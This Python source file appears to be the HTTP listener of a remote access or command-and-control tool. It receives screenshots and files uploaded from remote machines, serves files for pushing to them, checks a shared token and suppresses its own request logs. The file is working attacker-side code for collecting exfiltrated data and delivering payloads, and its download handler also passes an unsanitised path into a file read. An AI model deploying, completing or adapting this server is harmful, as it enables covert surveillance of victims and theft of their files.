import os
from settings import HOST, HTTP_PORT, AUTH_TOKEN, SCREENSHOT_DIRECTORY, UPLOAD_DIRECTORY, DOWNLOAD_DIRECTORY, color
from http.server import BaseHTTPRequestHandler, HTTPServer
from random import randint
from datetime import datetime

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):

    #--- Get remote file with "upload" command ---
    def do_GET(self):
        if self.path.startswith("/download/"):
            # Check auth
            if not self.authenticate():
                self.send_response(500)
                return

            # Get file path
            filename = self.path[len("/download/"):]
            file_path = os.path.join(UPLOAD_DIRECTORY, filename)

            # Check if file exists
            if not os.path.exists(file_path):
                self.send_response(404)
                return

            # Send file
            self.send_response(200)
            self.send_header("Content-type", "application/octet-stream")
            self.end_headers()
            with open(file_path, "rb") as file:
                self.wfile.write(file.read())
            print(f"[{color.PURPLE}+{color.END}] File: {filename} > {color.GREEN}uploaded{color.END}!")


    #--- Screenshot and download commands ---
    def do_PUT(self):
        if self.path.startswith("/upload"):
            # Check auth
            if not self.authenticate():
                self.send_response(500)
                return
            
            action_header = self.headers.get("Action", "")

            # Select saving location
            if action_header == "screenshot":
                directory = SCREENSHOT_DIRECTORY
                time_name = datetime.now().strftime("%Y%m%d_%H-%M-%S")
                filename = "screen-" + time_name + ".png"
                print(f"[{color.PURPLE}+{color.END}] Screenshot at ({color.YELLOW}{time_name}{color.END}) {color.GREEN}saved{color.END}!")
            else:
                directory = DOWNLOAD_DIRECTORY
                # Get file path
                filename = os.path.basename(self.path)

                if os.path.exists(filename):
                    filename = f"{randint(100,999)}_{filename}"
                
                print(f"[{color.PURPLE}+{color.END}] File: {filename} > {color.GREEN}downloaded{color.END}!")

            # Save downloaded file
            with open(os.path.join(directory, filename), "wb") as file:
                content_length = int(self.headers["Content-Length"])
                file.write(self.rfile.read(content_length))

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"")

    #--- Auth middleware ---
    def authenticate(self):
        # Check auth token
        if "X-Auth" not in self.headers:
            return False
        if self.headers["X-Auth"] != AUTH_TOKEN:
            return False
        return True
    
    #Override the logs handler
    def log_message(self, format, *args):
        return

def http_run(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler):
    server_address = (HOST, HTTP_PORT)
    httpd = server_class(server_address, handler_class)
    print(f"[{color.GREEN}+{color.END}] HTTP running on {color.YELLOW}http://{HOST}:{HTTP_PORT}{color.END}")
    httpd.serve_forever()
